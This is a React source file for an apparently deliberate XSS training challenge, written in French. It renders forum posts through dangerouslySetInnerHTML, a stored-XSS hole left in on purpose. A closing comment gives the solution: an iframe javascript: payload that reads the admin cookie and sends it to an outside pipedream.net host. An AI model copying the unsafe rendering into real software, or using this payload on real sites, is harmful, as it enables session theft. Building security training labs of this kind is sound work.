import React, { ChangeEvent, FormEvent, useEffect, useState } from "react"
import { postMessageToForum, getMessagesFromForum } from "../../api";
import { Header, Hints } from "../../components";
import { storage } from "../../services";

export { Challenge2 }

type messageType = { author: string, value: string }

function Challenge2() {
    const [messageToPost, setMessageToPost] = useState("");
    const [messages, setMessages] = useState<messageType[]>([]);

    useEffect(() => {
        const userName = storage.user.getUserName();
        if (!userName) {
            return;
        }
        getMessagesFromForum(userName).then(({ data }) => {
            if (data) {
                setMessages(data as messageType[])
            }
        })
    }, [])

    return <>
        <Header title="Challenge 2" />
        <p>L'administrateur vient souvent se balader sur cette page. Essayez de choper son cookie la prochaine fois qu'il vient !</p>
        <form onSubmit={onSubmit}>
            <br />
            <label htmlFor="message">Message :</label><textarea cols={40} rows={10} id="message" name="message" value={messageToPost} onChange={onChangeMessageToPost} />
            <br />
            <br />
            <button type="submit">Soumettre</button>
        </form>
        <Hints challengeName="challenge2" />
        ---------------------------
        <ul>
            {messages.map((message, index) => <li key={message.value + index}>{message.author}<div dangerouslySetInnerHTML={{ __html: message.value }} /></li>)}
        </ul>

    </>

    function onChangeMessageToPost(e: ChangeEvent<HTMLTextAreaElement>) {
        setMessageToPost(e.target.value);
    }

    async function onSubmit(event: FormEvent<HTMLFormElement>) {
        event.preventDefault();
        if (!messageToPost) {
            return;
        }
        const userName = storage.user.getUserName() || "default";
        const { data, status } = await postMessageToForum({ value: messageToPost, author: userName })
        if (status === 201) {
            setMessageToPost("")
            setMessages(data as messageType[]);
        }
    }

}

// Solution : <iframe src="javascript:const url='https://eokmh4s8te4gein.m.pipedream.net?'+document.cookie.split(';').find(cookie => cookie.trim().startsWith('ADMIN_COOKIE')).trim('');document.write('<img src='+url+' />')" />
